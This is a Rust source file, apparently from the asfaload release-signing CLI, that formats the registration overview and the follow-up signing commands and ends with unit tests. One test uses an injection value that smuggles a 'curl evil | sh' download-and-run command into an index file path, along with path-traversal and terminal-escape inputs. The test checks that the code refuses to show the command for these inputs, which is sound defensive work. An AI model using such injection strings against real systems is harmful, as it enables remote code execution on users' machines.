use anstyle::Style;
use common::AsfaloadHashes;
use features_lib::constants::INDEX_FILE;
use rest_api_types::RegisterAssetsResponse;

use crate::cli::DEFAULT_BACKEND;
use crate::commands::signers_submission_output::{
    BOLD, SignaturesToCollect, follow_status_lines, is_safe_project_id, signatures_to_collect_lines,
};
use crate::utils::{program_name, strip_control_chars};

/// True when the index file path from the backend is safe to put in a
/// command for the signers.
fn is_safe_index_file_path(index_file_path: &str) -> bool {
    is_safe_project_id(index_file_path) && index_file_path.ends_with(&format!("/{INDEX_FILE}"))
}

/// Print the output of a successful register-assets.
pub fn print_registration_overview(
    response: &RegisterAssetsResponse,
    index_digest: &AsfaloadHashes,
    backend_url: &str,
) {
    let non_default_backend = (backend_url != DEFAULT_BACKEND).then_some(backend_url);
    // anstream removes the styles when stdout is not a terminal.
    anstream::print!(
        "{}",
        registration_overview(
            response,
            index_digest,
            non_default_backend,
            &program_name(),
            true,
        )
    );
}

/// Build the human output after a successful register-assets.
///
/// `backend_url` is `Some` only when the user did not use the default backend.
/// Signers must then contact the same backend, so the command shows it.
pub fn registration_overview(
    response: &RegisterAssetsResponse,
    index_digest: &AsfaloadHashes,
    backend_url: Option<&str>,
    executable: &str,
    with_ansi: bool,
) -> String {
    let bold = if with_ansi { BOLD } else { Style::new() };
    let headline = match &response.index_file_path {
        Some(path) => format!(
            "{bold}Release registered:{bold:#} {}",
            strip_control_chars(path)
        ),
        None => format!("{bold}Release registered{bold:#}"),
    };
    let mut lines = vec![
        headline,
        "Your signature is included.".to_string(),
        String::new(),
    ];
    let file_path = response
        .index_file_path
        .as_deref()
        .filter(|path| is_safe_index_file_path(path));
    let to_collect = SignaturesToCollect {
        required_signers: &response.required_signers,
        file_path,
        digest: index_digest,
        complete_message: "The release is fully signed. No more signatures are necessary.",
        unexpected_data_warning: "The backend returned an unexpected index file path.",
    };
    lines.extend(signatures_to_collect_lines(
        &to_collect,
        backend_url,
        executable,
        bold,
    ));
    lines.extend(follow_status_lines(&to_collect, backend_url, executable));
    let mut output = lines.join("\n");
    output.push('\n');
    output
}

#[cfg(test)]
mod tests {
    use super::*;

    const INDEX_PATH: &str = "https/github.com/443/acme/tool/releases/tag/v1.0/asfaload.index.json";

    fn response(required_signers: Vec<&str>) -> RegisterAssetsResponse {
        RegisterAssetsResponse {
            success: true,
            message: "unused".to_string(),
            index_file_path: Some(INDEX_PATH.to_string()),
            required_signers: required_signers.into_iter().map(String::from).collect(),
            index_digest: digest(),
        }
    }

    fn digest() -> AsfaloadHashes {
        common::sha512_for_content(&b"index content"[..]).unwrap()
    }

    fn overview_for(response: &RegisterAssetsResponse) -> String {
        registration_overview(response, &digest(), None, "asfaload-cli", false)
    }

    #[test]
    fn overview_with_missing_signatures_shows_keys_and_sign_command() {
        let output = overview_for(&response(vec!["asfaload-pub:key-a", "asfaload-pub:key-b"]));
        let expected = format!(
            "Release registered: {INDEX_PATH}\n\
             Your signature is included.\n\
             \n\
             Keys that can still sign\n  \
             asfaload-pub:key-a\n  \
             asfaload-pub:key-b\n\
             \n\
             Next step\n  \
             Send this command to the signers. Each signer replaces <secret-key>\n  \
             with their secret key file:\n\
             \n     \
             asfaload-cli sign-pending \\\n       \
             --digest {} \\\n       \
             {INDEX_PATH} \\\n       \
             --secret-key <secret-key>\n\
             \n  \
             To follow the status of the signature, run this command:\n\
             \n     \
             asfaload-cli signature-status \\\n       \
             {INDEX_PATH} \\\n       \
             --secret-key <secret-key>\n",
            digest()
        );
        assert_eq!(output, expected);
    }

    #[test]
    fn overview_when_release_is_fully_signed_has_no_sign_command() {
        assert_eq!(
            overview_for(&response(vec![])),
            format!(
                "Release registered: {INDEX_PATH}\n\
                 Your signature is included.\n\
                 \n\
                 The release is fully signed. No more signatures are necessary.\n"
            )
        );
    }

    #[test]
    fn overview_with_non_default_backend_adds_backend_url_before_secret_key() {
        let output = registration_overview(
            &response(vec!["asfaload-pub:key-a"]),
            &digest(),
            Some("http://localhost:3000"),
            "asfaload-cli",
            false,
        );
        assert!(
            output.contains(
                "       --backend-url http://localhost:3000 \\\n       --secret-key <secret-key>\n"
            ),
            "backend URL must come just before the secret key placeholder, got: {output}"
        );
        assert_eq!(
            output
                .matches("--backend-url http://localhost:3000")
                .count(),
            2,
            "both the sign-pending and the signature-status commands need the backend URL, got: {output}"
        );
    }

    #[test]
    fn overview_withholds_command_for_unexpected_index_path() {
        let cases = [
            Some("x; curl evil | sh #/asfaload.index.json".to_string()),
            Some("https/github.com/443/acme/tool/releases/tag/v1.0/other.json".to_string()),
            Some("https/github.com/443/acme/../tool/asfaload.index.json".to_string()),
            None,
        ];
        for index_file_path in cases {
            let mut r = response(vec!["asfaload-pub:key-a"]);
            r.index_file_path = index_file_path.clone();
            let output = overview_for(&r);
            assert!(
                !output.contains("sign-pending"),
                "{index_file_path:?}: command must not be shown, got: {output}"
            );
            assert!(
                !output.contains("signature-status"),
                "{index_file_path:?}: status command must not be shown, got: {output}"
            );
            assert!(
                output.contains("The backend returned an unexpected index file path."),
                "{index_file_path:?}: warning missing, got: {output}"
            );
            assert!(output.contains("list-pending"), "got: {output}");
        }
    }

    #[test]
    fn overview_without_index_path_has_headline_without_path() {
        let mut r = response(vec![]);
        r.index_file_path = None;
        assert!(overview_for(&r).starts_with("Release registered\nYour signature is included.\n"));
    }

    #[test]
    fn overview_removes_control_characters_from_index_path_and_keys() {
        let mut r = response(vec!["asfaload-pub:\x1b[2Kkey-a"]);
        r.index_file_path = Some(format!("{INDEX_PATH}\x1b[2K"));
        let output = overview_for(&r);
        assert!(!output.contains('\x1b'), "got: {output:?}");
    }

    #[test]
    fn overview_without_ansi_has_no_escape_codes_and_with_ansi_has_some() {
        let build = |with_ansi| {
            registration_overview(
                &response(vec!["asfaload-pub:key-a"]),
                &digest(),
                None,
                "asfaload-cli",
                with_ansi,
            )
        };
        assert!(!build(false).contains('\x1b'));
        assert!(build(true).contains('\x1b'));
    }
}
